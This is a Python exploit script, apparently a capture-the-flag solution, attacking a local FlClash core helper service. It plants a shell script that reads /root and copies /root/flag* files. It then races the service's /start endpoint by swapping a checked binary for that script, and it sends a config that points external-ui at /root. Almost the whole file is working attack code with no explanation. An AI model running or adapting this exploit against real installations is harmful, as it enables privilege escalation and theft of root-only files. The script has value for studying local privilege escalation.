import os
import shutil
import threading
import time
import zipfile

import requests

HOST = '127.0.0.1'
PORT = 47890

REAL_PATH = ('/tmp/FlClashCore', '')
EVIL_PATH = ('/tmp/evil.sh', '')
LINK_PATH = '/tmp/run'


def setup_evil():
    with open(EVIL_PATH[0], "w") as f:
        f.write("#!/bin/bash\n")
        f.write("echo hello world > /tmp/test.txt\n")
        f.write("ls /root/ > /tmp/output.txt\n")
        f.write("cat /root/flag* > /tmp/flag.txt\n")

    os.chmod(EVIL_PATH[0], 0o777)


def get(path, params=None):
    url = f'http://{HOST}:{PORT}{path}'
    response = requests.get(url, params=params)
    return response.text


def post(path, data=None):
    url = f'http://{HOST}:{PORT}{path}'
    response = requests.post(url, json=data)
    print(response.status_code)
    return response.text


def put(path, data=None):
    url = f'http://{HOST}:{PORT}{path}'
    response = requests.put(url, json=data)
    return response.text


def start(arg, path=REAL_PATH[0]):
    data = {
        'path': path,
        'arg': arg
    }
    print(post('/start', data=data))


def log():
    print(get('/ping'))
    print(get('/logs'))
    # print(post('/start', data={'path': '/tmp/FlClashCore', 'arg': ''}))


def stop():
    print(post('/stop'))


def race_1():
    x = post('/start', data={'path': LINK_PATH, 'arg': ''})
    print(x)


def race_2():
    time.sleep(0.01)
    os.remove(LINK_PATH)
    shutil.copy(EVIL_PATH[0], LINK_PATH)


def race():
    if os.path.exists(LINK_PATH):
        os.remove(LINK_PATH)
    shutil.copy(REAL_PATH[0], LINK_PATH)
    # 需要同时执行
    t1 = threading.Thread(target=race_1)
    t2 = threading.Thread(target=race_2)
    t1.start()
    t2.start()
    t1.join()
    t2.join()


# 第一小题
# setup_evil()
# 需要退出去手动 chmod 777 /tmp/evil.sh 后回来运行下面的
# while True:
    # race()

# 第二小题
# setup_evil()
# 需要退出去手动 chmod 777 /tmp/evil.sh 并改名为 /tmp/FlClashCore 后回来运行下面的
# make_zip()

# start('/tmp/uds_socket')


def put_file():
    print(put('/configs', {'path': '', 'payload': '''
external-ui: /root
external-ui-url: "http://127.0.0.1:6666/"
external-ui-name: secure
    '''}))


def make_zip():
    with zipfile.ZipFile('/tmp/evil.zip', 'w') as zf:
        zf.write(REAL_PATH[0])

# PORT = 9090
# put_file()
# PORT = 47890
# start('')
